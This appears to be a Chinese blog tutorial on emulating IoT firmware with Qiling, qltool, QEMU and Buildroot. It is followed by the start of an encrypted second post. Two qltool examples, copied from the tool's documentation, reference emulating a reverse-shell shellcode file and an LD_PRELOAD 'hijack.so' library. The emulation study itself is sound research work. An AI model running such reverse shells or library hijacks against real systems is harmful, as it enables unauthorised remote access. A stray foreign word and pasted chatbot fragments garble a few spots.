    <url>/2025/08/01/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<p><strong>什么是固件模拟？</strong></p>
<p>固件模拟是通过一些模拟器实现的在x86等其他架构电脑环境中运行物联网设备固件的方式。</p>
<p>**主要的模拟架构：**主流的物联网设备固件的架构是arm和mips。</p>
<p>**模拟方式：**单应用模拟和系统模拟</p>
<p><strong>主流的模拟器：</strong></p>
<ul>
<li>qemu：目前使用最多的模拟器，支持用户态模拟和系统态的模拟</li>
<li>qiling：只支持单应用模拟，但是由于qiling是模拟框架，所以更加灵活</li>
</ul>
<blockquote>
<p>安装方式：pip3 install qiling  </p>
<p>官方文档<a href="https://docs.qiling.io/en/latest">https://docs.qiling.io/en/latest</a></p>
</blockquote>
<h1 id="qiling介绍"><a href="#qiling介绍" class="headerlink" title="qiling介绍"></a>qiling介绍</h1><p><strong>基本流程</strong></p>
<ol>
<li>基本代码编写</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    argv = <span class="string">r&#x27;./bin/httpd&#x27;</span>.split()</span><br><span class="line">    rootfs = <span class="string">r&#x27;./&#x27;</span></span><br><span class="line">    </span><br><span class="line">    ql = Qiling(argv,rootfs)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>问题定位</li>
</ol>
<p>一般有时候会出现错误信息，不同的固件错误信息不一样，要找到错误信息进行，定位问题所在</p>
<ol start="3">
<li>修改代码</li>
</ol>
<p>根据问题所在修改代码，添加一些函数等</p>
<h2 id="qiling示例"><a href="#qiling示例" class="headerlink" title="qiling示例"></a>qiling示例</h2><h2 id="window、linux-相互执行-对方可执行文件"><a href="#window、linux-相互执行-对方可执行文件" class="headerlink" title="window、linux 相互执行 对方可执行文件"></a>window、linux 相互执行 对方可执行文件</h2><h3 id="在-linux-下使用-qiling-框架执行-exe-文件"><a href="#在-linux-下使用-qiling-框架执行-exe-文件" class="headerlink" title="在 linux 下使用 qiling 框架执行 exe 文件"></a>在 linux 下使用 qiling 框架执行 exe 文件</h3><p>在 linux 上使用 qiling 运行 exe 时，需要模拟 windows系统环境(  window 的 dll 和 注册表 等组件 )才能运行。qiling 提供了一个脚本：在<code>qiling/examples/scripts/dllscollector.bat</code>，在 windows 上执行，就能得到全部所需要的依赖</p>
<img data-src="../images/image-20250816152743326.png" alt="image-20250816152743326" style="zoom:67%;" />

<p>在qiling-master处以管理员模式打开cmd，执行<code>.\examples\scripts\dllscollector.bat</code>，即可在<code>/examples/rootfs</code>中找到运行后的结果，如下：</p>
<img data-src="../images/image-20250816154423703.png" alt="image-20250816154423703" style="zoom:67%;" />

<p>然后将<code>rootfs</code>整个文件夹移到已安装<code>qiling</code>的linux的系统里的一个文件夹中</p>
<p>示例代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sandbox to emulate the EXE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sandbox</span>(<span class="params">path, rootfs</span>):</span><br><span class="line">    <span class="comment"># setup Qiling engine</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># now emulate the EXE</span></span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 将 rootfs 的路径修正为 &quot;rootfs/x8664_windows&quot;</span></span><br><span class="line">    my_sandbox([<span class="string">&quot;rootfs/x8664_windows/bin/hello.exe&quot;</span>], <span class="string">&quot;rootfs/x8664_windows&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>hello.c在win11中用gcc编译<code>gcc hello.c -o hello.exe -static</code>的，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img data-src="../images/image-20250816162802144.png" alt="image-20250816162802144" style="zoom:67%;" />

<h3 id="在-windows-下使用-qiling-框架执行-linux-可执行文件"><a href="#在-windows-下使用-qiling-框架执行-linux-可执行文件" class="headerlink" title="在 windows 下使用 qiling 框架执行 linux 可执行文件"></a>在 windows 下使用 qiling 框架执行 linux 可执行文件</h3><ul>
<li>在 linux 上执行 dylibcollector.sh 生成 linux 环境文件，然后把生成的文件放到 windows 上</li>
</ul>
<h2 id="Qltool-工具"><a href="#Qltool-工具" class="headerlink" title="Qltool 工具"></a>Qltool 工具</h2><p>文档：<a href="https://docs.qiling.io/en/latest/qltool/">https://docs.qiling.io/en/latest/qltool/</a></p>
<p>Qiling 还提供了一个名为 qltool 的强大工具，可以快速模拟出目标 Shellcode 或可执行文件的源码。qltool 有三个可用的命令</p>
<p>Qiling Framework 还提供了一个名为的友好工具，<code>qltool</code>用于快速模拟 shellcode 和可执行二进制文件。</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><code>qltool</code>有三个可用命令： - <code>run</code>：模拟程序二进制文件 - <code>code</code>：执行 shellcode 摘录 - <code>qltui</code>：显示 qltool 的终端用户界面 - <code>examples</code>：发出使用示例</p>
<h3 id="运行选项"><a href="#运行选项" class="headerlink" title="运行选项"></a>运行选项</h3><table>
<thead>
<tr>
<th>选项名称</th>
<th>缩写</th>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>--filename</code></td>
<td><code>-f</code></td>
<td><em>文件名</em></td>
<td>要模拟的二进制文件名</td>
</tr>
<tr>
<td><code>--rootfs</code></td>
<td></td>
<td><em>目录名</em></td>
<td>仿真根目录；这是所有库所在的位置</td>
</tr>
<tr>
<td><code>--args</code></td>
<td></td>
<td><em>…</em></td>
<td>模拟程序命令行参数</td>
</tr>
</tbody></table>
<p>注意： - 如果<code>--filename</code>未指定，最后一个参数将被视为程序二进制文件 - 如果<code>--args</code>未指定，所有尾随参数将被视为程序命令行参数</p>
<h3 id="代码选项"><a href="#代码选项" class="headerlink" title="代码选项"></a>代码选项</h3><table>
<thead>
<tr>
<th>选项名称</th>
<th>缩写</th>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>--filename</code></td>
<td><code>-f</code></td>
<td><em>文件名</em></td>
<td>输入文件名</td>
</tr>
<tr>
<td><code>--input</code></td>
<td><code>-i</code></td>
<td><em>十六进制</em></td>
<td>输入十六进制字符串；仅当<code>--format</code>设置为时相关<code>hex</code></td>
</tr>
<tr>
<td><code>--format</code></td>
<td></td>
<td><code>asm</code>，， <code>hex``bin</code></td>
<td>指定文件或输入格式：汇编、十六进制字符串或二进制文件</td>
</tr>
<tr>
<td><code>--arch</code></td>
<td></td>
<td><code>x86</code>，，，，，，，， <code>x8664``arm``arm_thumb``arm64``mips``a8086``evm</code></td>
<td>目标架构</td>
</tr>
<tr>
<td><code>--endian</code></td>
<td></td>
<td><code>little</code>， <code>big</code></td>
<td>目标字节顺序（默认值<code>little</code>：）</td>
</tr>
<tr>
<td><code>--os</code></td>
<td></td>
<td><code>linux</code>，，，，，，， <code>freebsd``macos``windows``uefi``dos``evm</code></td>
<td>目标操作系统</td>
</tr>
</tbody></table>
<p>注意：- 当<code>--format</code>设置为时<code>hex</code>，<code>qltool</code>将首先在 中查找数据<code>--input</code>。如果没有指定输入字符串，它将引用 中指定的文件<code>--filename</code></p>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><table>
<thead>
<tr>
<th>选项名称</th>
<th>缩写</th>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>--verbose</code></td>
<td><code>-v</code></td>
<td><code>off</code>，，，，， <code>default``debug``disasm``dump</code></td>
<td>设置日志记录详细级别</td>
</tr>
<tr>
<td><code>--env</code></td>
<td></td>
<td><em>文件名</em></td>
<td>包含环境字典的 Pickle 文件的路径，<strong>或</strong>计算结果为字典的 Python 字符串</td>
</tr>
<tr>
<td><code>--gdb</code></td>
<td><code>-g</code></td>
<td>[<em>服务器:端口</em>]</td>
<td>启用 gdb 服务器</td>
</tr>
<tr>
<td><code>--qdb</code></td>
<td></td>
<td></td>
<td>在入口点附加 qdb。目前仅支持 MIPS 和 ARM（Thumb 模式）</td>
</tr>
<tr>
<td><code>--rr</code></td>
<td></td>
<td></td>
<td>启用 qdb<em>记录和重放</em>功能；需要 <code>--qdb</code></td>
</tr>
<tr>
<td><code>--profile</code></td>
<td></td>
<td><em>文件名</em></td>
<td>指定配置文件</td>
</tr>
<tr>
<td><code>--no-console</code></td>
<td></td>
<td></td>
<td>不要将程序输出到<em>标准输出</em></td>
</tr>
<tr>
<td><code>--filter</code></td>
<td><code>-e</code></td>
<td><em>正则表达式</em></td>
<td>在日志输出上应用过滤正则表达式</td>
</tr>
<tr>
<td><code>--log-file</code></td>
<td></td>
<td><em>文件名</em></td>
<td>将日志发送到文件</td>
</tr>
<tr>
<td><code>--log-plain</code></td>
<td></td>
<td></td>
<td>不要在日志输出中使用颜色；当将日志发送到文件时很有用</td>
</tr>
<tr>
<td><code>--root</code></td>
<td></td>
<td></td>
<td>启用<em>sudo 必需</em>模式</td>
</tr>
<tr>
<td><code>--debug-stop</code></td>
<td></td>
<td></td>
<td>第一次出现错误时停止模拟；需要<code>verbose</code>设置为<code>debug</code>或<code>dump</code></td>
</tr>
<tr>
<td><code>--multithread</code></td>
<td><code>-m</code></td>
<td></td>
<td>以多线程模式执行程序</td>
</tr>
<tr>
<td><code>--timeout</code></td>
<td></td>
<td><em>微秒</em></td>
<td>以微秒为单位设置仿真超时（1000000μs &#x3D; 1s）</td>
</tr>
<tr>
<td><code>--coverage-file</code></td>
<td><code>-c</code></td>
<td><em>文件名</em></td>
<td>代码覆盖率输出文件</td>
</tr>
<tr>
<td><code>--coverage-format</code></td>
<td></td>
<td><code>drcov</code>， <code>drcov_exact</code></td>
<td>代码覆盖率文件格式</td>
</tr>
<tr>
<td><code>--json</code></td>
<td></td>
<td></td>
<td>以 JSON 格式发出模拟报告</td>
</tr>
</tbody></table>
<h3 id="qltui-—-qltool-的终端用户界面"><a href="#qltui-—-qltool-的终端用户界面" class="headerlink" title="qltui — qltool 的终端用户界面"></a>qltui — qltool 的终端用户界面</h3><p>qltui：$ .&#x2F;qltool qltui  终端用户界面<code>qltool</code>。</p>
<ul>
<li>运行于 之上 <code>qltool</code>。</li>
<li>使用接口接受数据 <code>run</code> 和 <code>code</code> 命令。</li>
<li>返回一个 <code>Argparse Namespace</code> 对象 <code>qltool</code> 以供执行。</li>
<li>交互式报告查看器加上将其保存为 pdf 的选项。</li>
</ul>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode:"></a>shellcode:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool code --os linux --<span class="built_in">arch</span> arm --format hex -f examples/shellcodes/linarm32_tcp_reverse_shell.hex</span><br><span class="line">$ ./qltool code --os linux --<span class="built_in">arch</span> x86 --format asm -f examples/shellcodes/lin32_execve.asm</span><br></pre></td></tr></table></figure>

<h4 id="binary-file"><a href="#binary-file" class="headerlink" title="binary file:"></a>binary file:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f examples/rootfs/x8664_linux/bin/x8664_hello --rootfs  examples/rootfs/x8664_linux/</span><br><span class="line">$ ./qltool run -f examples/rootfs/mips32el_linux/bin/mips32el_hello --rootfs examples/rootfs/mips32el_linux</span><br></pre></td></tr></table></figure>

<h4 id="UEFI-file"><a href="#UEFI-file" class="headerlink" title="UEFI file:"></a>UEFI file:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f examples/rootfs/x8664_efi/bin/TcgPlatformSetupPolicy --rootfs examples/rootfs/x8664_efi --<span class="built_in">env</span> examples/rootfs/x8664_efi/rom2_nvar.pickel</span><br></pre></td></tr></table></figure>

<h4 id="GDB-debugger-enable"><a href="#GDB-debugger-enable" class="headerlink" title="GDB debugger enable:"></a>GDB debugger enable:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f examples/rootfs/x8664_linux/bin/x8664_hello --gdb 127.0.0.1:9999 --rootfs examples/rootfs/x8664_linux</span><br></pre></td></tr></table></figure>

<h4 id="Binary-file-and-argv"><a href="#Binary-file-and-argv" class="headerlink" title="Binary file and argv:"></a>Binary file and argv:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f examples/rootfs/x8664_linux/bin/x8664_args --rootfs examples/rootfs/x8664_linux --args test1 test2 test3</span><br><span class="line">$ ./qltool run --rootfs examples/rootfs/x8664_linux examples/rootfs/x8664_linux/bin/x8664_args test1 test2 test3</span><br></pre></td></tr></table></figure>

<h4 id="Binary-file-and-various-output-format"><a href="#Binary-file-and-various-output-format" class="headerlink" title="Binary file and various output format:"></a>Binary file and various output format:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f examples/rootfs/mips32el_linux/bin/mips32el_hello --rootfs examples/rootfs/mips32el_linux --verbose disasm</span><br></pre></td></tr></table></figure>

<h4 id="Binary-file-and-env"><a href="#Binary-file-and-env" class="headerlink" title="Binary file and env:"></a>Binary file and env:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool run -f jexamples/rootfs/x8664_linux/bin/tester --rootfs jexamples/rootfs/x8664_linux --<span class="built_in">env</span> <span class="string">&#x27;&#123;&quot;LD_PRELOAD&quot;:&quot;hijack.so&quot;&#125;&#x27;</span> --verbose debug</span><br></pre></td></tr></table></figure>

<h4 id="qltui"><a href="#qltui" class="headerlink" title="qltui"></a>qltui</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./qltool qltui</span><br></pre></td></tr></table></figure>



<h1 id="qemu-system指令介绍"><a href="#qemu-system指令介绍" class="headerlink" title="qemu-system指令介绍"></a>qemu-system指令介绍</h1><p>QEMU (Quick Emulator) 是一款强大的开源虚拟化软件，它能够模拟多种硬件环境，让用户可以在一台物理计算机上运行不同的操作系统。 QEMU 的功能主要通过命令行指令来调用，这些指令参数丰富，可以实现灵活的虚拟机配置和管理。</p>
<p>QEMU 主要包含两大组件：</p>
<ul>
<li><strong>qemu-system-</strong>*: 这是一个完整的虚拟机模拟器，可以模拟一个完整的计算机系统，包括处理器和各种外围设备，从而可以运行未经修改的操作系统。 例如，<code>qemu-system-x86_64</code> 用于模拟 x86_64 架构的计算机系统。</li>
<li><strong>qemu-img</strong>: 这是一个磁盘镜像管理工具，用于创建、转换和修改不同格式的虚拟磁盘镜像文件。</li>
</ul>
<h2 id="固件模拟场景下的-QEMU-指令"><a href="#固件模拟场景下的-QEMU-指令" class="headerlink" title="固件模拟场景下的 QEMU 指令"></a>固件模拟场景下的 QEMU 指令</h2><p>在固件模拟中，我们的目标通常是让一个为特定硬件（如路由器、摄像头）编译的固 সেনারা（Firmware）在 QEMU 模拟的环境中运行起来。这通常比运行一个标准的桌面操作系统要复杂，因为固件与硬件高度耦合。</p>
<p><strong>核心指令：qemu-system-<arch></strong></p>
<p>这里的 <arch> 指的是固件所针对的处理器架构，常见于物联网设备的是 arm 和 mips。</p>
<p><strong>常用且关键的选项：</strong></p>
<ul>
<li><strong>-M <machine></strong>: 指定要模拟的单板计算机（Machine）。这是固件模拟中最关键的参数之一。因为固件是为特定硬件板卡编译的，你需要告诉 QEMU 模拟一个尽可能接近真实设备的硬件环境。<ul>
<li><strong>如何找到合适的 machine？</strong> 你可以使用 qemu-system-arm -M ? 来查看所有支持的 ARM 单板。有时需要选择一个通用板卡（如 vexpress-a9 或 versatilepb），或者社区已经为特定设备（如 raspi2 树莓派）创建了模型。</li>
<li><strong>示例</strong>: -M vexpress-a9</li>
</ul>
</li>
<li><strong>-kernel <zImage></strong>: 指定要加载的内核镜像文件。在固件模拟中，这通常是从固件包里解压出来的 Linux 内核文件（例如 zImage, uImage）。.</li>
<li><strong>-initrd <initramfs></strong>: 指定初始内存文件系统 (Initial RAM File System)。这通常是固件解压后的根文件系统，包含了所有必要的程序和库文件。</li>
<li><strong>-append “console&#x3D;ttyAMA0 root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;sbin&#x2F;init”</strong>: 向内核传递启动参数。这是另一个至关重要的步骤。<ul>
<li>console&#x3D;ttyAMA0: 指定内核的控制台输出设备。你需要根据你选择的 -M 参数来确定正确的串口设备名称。</li>
<li>root&#x3D;&#x2F;dev&#x2F;ram: 告诉内核根文件系统在内存中。</li>
<li>rdinit&#x3D;&#x2F;sbin&#x2F;init: 指定启动后在根文件系统中执行的第一个进程。</li>
</ul>
</li>
<li><strong>-nographic</strong>: 禁用图形界面，并将虚拟机的串口输出重定向到当前的终端。这对于调试和查看固件的启动日志至关重要。</li>
<li><strong>-drive file&#x3D;&lt;disk.img&gt;,format&#x3D;raw,if&#x3D;sd</strong>: 加载一个完整的磁盘镜像作为 SD 卡。有些固件不是以内核+内存文件系统的方式启动，而是直接从一个完整的磁盘镜像启动。</li>
</ul>
<p><strong>一个典型的固件模拟启动命令示例：</strong></p>
<p>Generated bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel uImage \</span><br><span class="line">-initrd rootfs.img.gz \</span><br><span class="line">-append &quot;root=/dev/ram rdinit=/bin/sh console=ttyAMA0&quot; \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>

<p>Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>.Bash</p>
<p>这个命令尝试在一个通用的 vexpress-a9 板卡上，加载 uImage 内核和 rootfs.img.gz 文件系统，并将启动后的 shell 重定向到当前终端。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="核心指令：qemu-system"><a href="#核心指令：qemu-system" class="headerlink" title="核心指令：qemu-system-*"></a><strong>核心指令：qemu-system-</strong>*</h3><p>这是启动和管理虚拟机的核心指令。其基本用法如下：<br><code>qemu-system-x86_64 [options] [disk_image]</code></p>
<p>其中 <code>[options]</code> 是一系列用于配置虚拟机资源的参数，而 <code>[disk_image]</code> 是虚拟机的磁盘镜像文件。</p>
<p><strong>常用参数选项：</strong></p>
<ul>
<li><strong>-m [size]</strong>: 设置虚拟机的内存大小。例如 <code>-m 512M</code> 表示分配 512MB 内存给虚拟机。</li>
<li><strong>-cpu [model]</strong>: 指定模拟的 CPU 型号。可以使用 <code>-cpu ?</code> 来查询当前 QEMU 版本支持的 CPU 型号。</li>
<li><strong>-hda [file]</strong>: 将指定文件作为虚拟机的第一个 IDE 硬盘。</li>
<li><strong>-cdrom [file]</strong>: 将指定文件作为虚拟机的光驱镜像。</li>
<li><strong>-boot [order&#x3D;drives]</strong>: 设置虚拟机的启动顺序。例如，<code>-boot order=dc</code> 表示优先从光驱 (d) 启动，其次是硬盘 (c)。</li>
<li><strong>-net nic</strong>: 为虚拟机创建一个网卡。</li>
<li><strong>-net user</strong>: 使用用户模式网络，这是一种简单方便的网络配置方式，无需管理员权限。</li>
<li><strong>-vnc :[display]</strong>: 启用 VNC 显示，允许通过 VNC 客户端远程连接到虚拟机的图形界面。</li>
<li><strong>-nographic</strong>: 禁用图形界面，让虚拟机在当前终端以命令行方式启动。</li>
<li><strong>-s</strong>: 启动 GDB 调试服务器。</li>
<li><strong>-S</strong>: 在启动时暂停虚拟机，等待调试器连接。</li>
<li><strong>-enable-kvm</strong>: 启用 KVM (Kernel-based Virtual Machine)，利用硬件虚拟化技术来提升虚拟机性能。</li>
</ul>
<h3 id="磁盘管理工具：qemu-img"><a href="#磁盘管理工具：qemu-img" class="headerlink" title="磁盘管理工具：qemu-img"></a><strong>磁盘管理工具：qemu-img</strong></h3><p><code>qemu-img</code> 是一个功能强大的磁盘镜像管理工具，支持多种虚拟磁盘格式，包括 raw、qcow2、vmdk、vdi 等。</p>
<p><strong>常用命令：</strong></p>
<ul>
<li><strong>create</strong>: 创建一个新的虚拟磁盘镜像文件。<ul>
<li><strong>用法</strong>: <code>qemu-img create [-f fmt] filename [size]</code></li>
<li><strong>示例</strong>: <code>qemu-img create -f qcow2 my_disk.qcow2 10G</code> 创建一个 10GB 大小的 qcow2 格式镜像文件。 qcow2 是 QEMU 目前使用最广泛的镜像格式。</li>
</ul>
</li>
<li><strong>convert</strong>: 转换虚拟磁盘镜像的格式。<ul>
<li><strong>用法</strong>: <code>qemu-img convert [-f src_fmt] -O dst_fmt src_image dst_image</code></li>
<li><strong>示例</strong>: <code>qemu-img convert -O qcow2 rhel7.img rhel7-a.qcow2</code> 将 raw 格式的镜像转换为 qcow2 格式。</li>
</ul>
</li>
<li><strong>info</strong>: 显示虚拟磁盘镜像文件的信息。<ul>
<li><strong>用法</strong>: <code>qemu-img info filename</code></li>
<li><strong>示例</strong>: <code>qemu-img info my_disk.qcow2</code> 会显示镜像的格式、虚拟大小、实际占用磁盘空间等信息。</li>
</ul>
</li>
<li><strong>resize</strong>: 调整虚拟磁盘镜像文件的大小。<ul>
<li><strong>用法</strong>: <code>qemu-img resize filename [+|-]size</code></li>
<li><strong>示例</strong>: <code>qemu-img resize my_disk.qcow2 +2G</code> 将镜像文件增加 2GB。 需要注意的是，增加或减少镜像文件大小后，还需要在客户机操作系统内部进行相应的分区和文件系统调整才能生效。</li>
</ul>
</li>
<li><strong>snapshot</strong>: 管理虚拟机的快照。<ul>
<li><strong>用法</strong>: <code>qemu-img snapshot [-l | -a snapshot | -c snapshot | -d snapshot] filename</code></li>
<li><strong>选项</strong>: <code>-l</code> 列出快照，<code>-c</code> 创建快照，<code>-d</code> 删除快照，<code>-a</code> 应用快照。</li>
</ul>
</li>
</ul>
<p><strong>支持的镜像格式简介：</strong></p>
<ul>
<li><strong>raw</strong>: 原始的磁盘镜像格式，简单且易于移植。</li>
<li><strong>qcow2</strong>: QEMU 的原生格式，支持写时复制、稀疏文件、加密和压缩等高级功能，是目前最常用的格式。</li>
<li><strong>vmdk</strong>: 兼容 VMware 的镜像文件格式。</li>
<li><strong>vdi</strong>: 兼容 VirtualBox 的镜像文件格式。</li>
</ul>
<p>通过灵活运用 <code>qemu-system-*</code> 和 <code>qemu-img</code> 的各种命令和参数，用户可以高效地创建、配置和管理虚拟机，满足不同的开发、测试和虚拟化需求。</p>
<h1 id="系统内核编译"><a href="#系统内核编译" class="headerlink" title="系统内核编译"></a>系统内核编译</h1><h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>Buildroot 可以通过交叉编译生成嵌入式 Linux 系统，提供选择的库有 glibc、uClibc、musl，支持的架构包括 arm、mips、PowerPC 等主流架构。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -O https://buildroot.org/downloads/Vagrantfile; vagrant up</span><br></pre></td></tr></table></figure>

<p><strong>如何使用</strong></p>
<p>实操一下</p>
<p>第一步安装，直接去官网下载就行，其中这个<a href="https://developer.hashicorp.com/vagrant/install">vargant来这里下载</a></p>
<p>第二步安装解压后<code>cd configs</code>，关于这个configs目录介绍：</p>
<p>configs 目录是 Buildroot 的<strong>官方模板库</strong>。你的工作流程永远是：</p>
<ol>
<li>从 configs 目录中选择一个最合适的 _defconfig 文件作为起点。</li>
<li>使用 make <board_name>_defconfig 命令将其应用为项目当前的 .config 文件。</li>
<li>使用 make menuconfig 进行个性化定制。</li>
<li>使用 make 进行编译。</li>
</ol>
<p>第三步构建<code>.config</code></p>
<p>第四步<code>make menuconfig</code>设定好后就可以make了</p>
<blockquote>
<p>你正在 Windows Subsystem for Linux (WSL) 环境下工作。WSL 为了方便，默认会将你 Windows 系统的 PATH 环境变量自动追加到 Linux 的 PATH 中。</p>
<p>问题就出在这里。你的 Windows PATH 中包含了大量 Buildroot 编译脚本无法处理的条目：</p>
<ol>
<li><strong>包含空格的路径</strong>：这是最主要的问题。</li>
</ol>
<ul>
<li>&#x2F;mnt&#x2F;c&#x2F;Program Files&#x2F;Eclipse Adoptium&#x2F;…</li>
<li>&#x2F;mnt&#x2F;c&#x2F;Program Files (x86)&#x2F;Windows Kits&#x2F;…</li>
<li>&#x2F;mnt&#x2F;d&#x2F;Web&#x2F;Microsoft VS Code&#x2F;bin</li>
</ul>
<ol start="2">
<li><strong>包含非英文字符（非 ASCII）的路径</strong>：这也是一个致命问题。</li>
</ol>
<ul>
<li>&#x2F;mnt&#x2F;d&#x2F;虚拟机&#x2F;vmware&#x2F;bin&#x2F;</li>
<li>&#x2F;mnt&#x2F;d&#x2F;杂物&#x2F;vivo 套件&#x2F;pcsuite&#x2F;</li>
</ul>
<p>Buildroot 的检查脚本非常严格，当它在 PATH 变量中看到这些空格或特殊字符时，就会认为 PATH “不干净”，并立即报错退出。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h3><p>你有两种解决方案，一种是临时的（推荐，快速解决当前问题），一种是永久的（更彻底）。</p>
<h4 id="方案一：临时指定一个“干净”的-PATH-推荐"><a href="#方案一：临时指定一个“干净”的-PATH-推荐" class="headerlink" title="方案一：临时指定一个“干净”的 PATH (推荐)"></a><strong>方案一：临时指定一个“干净”的 PATH (推荐)</strong></h4><p>这是解决当前编译问题的最快、最直接的方法。我们可以在执行 make 命令时，临时为它指定一个只包含标准 Linux 路径的、干净的 PATH 变量。</p>
<p><strong>请在你的 buildroot-2025.02.4&#x2F; 目录下，执行下面这行命令：</strong></p>
<p>Generated bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin make</span><br></pre></td></tr></table></figure>

<p>Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>.Bash</p>
<p><strong>命令解释:</strong></p>
<ul>
<li>PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin：这部分会在执行 make 命令<strong>之前</strong>，临时将 PATH 环境变量设置为一个只包含最核心、最标准、最安全的 Linux 路径的集合。</li>
<li>make：紧跟在后面的 make 命令就会使用这个临时的、干净的 PATH 来执行。</li>
</ul>
<p>这个修改<strong>只会对这一条命令生效</strong>，不会影响你终端后续的其他命令，非常安全。</p>
<p>执行后，Buildroot 的环境检查应该就能通过，并正式开始编译了。</p>
<hr>
</blockquote>
<p>进入<code>./output/images</code>文件夹下有<code>rootfs.ext2</code>(系统文件)和<code>zImage</code>(这个解压一些就是内核)</p>
<p>创建一个tmp空目录，目的挂载文件系统，命令<code>mount rootfs.ext2 tmp</code></p>
<p>取消挂载<code>umount tmp</code></p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>日常笔记</title>
    <url>/2025/06/22/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="8b937ad6ac47bbfb51f742384246f1eaffdbc50331739562ea34e67a30357410">aa660c56d9a2d8389cfc1a02879f4fc7edd870ab9b16360cd85299dff2c2834a832bf24a8147ec32f0247ff1e8180f65bb214efe9e5784ec73814e6ec0e9af7e61e248b76c1ca52a1fd6d4557d7c123bc8f1d28e21c36a055525945eb700bb5a8871991da8b3d5b5a3b587d0067aeb7b9bdd8c949ec7d8c4a16a42bf6a60c7f4b829206bd5a07293f34d461d108d9512a343cd4729f35bdbecaf1d5b6f966745d6ff33c4a76b5b1620939fb0e3bf707c2e3d38a7f792f31cc1e5f22da85a02f31865bfc8716d849597a06612f1c5803aed41771687f73bf1bd53cad0ee9df5ed4fa70e9593e951e0a21a30e1dda09003c61e4ca66429ad5ae7737164e0e7a765233c31e3c10ead703c3b0193335f8335b963e1f7f262e9ac5e773b4fb52f58557bee32664a5d9ab8e91bf03871e8b00050ae06f9631d621295dd512971df8f9a07f0ba8fbfa8b24658479d7954771697c083ef304ad96bc69dced994d380f9310a87cdb1f065d92f48fa1348b9b01ed045571b622a1f851a160a43cf22c37f44d73df1e82c687404e2b51479fad69dd693f01a70f492a553f66c316adbbfb085c4fab325af26960d23308eac1ec271e124c8f7ea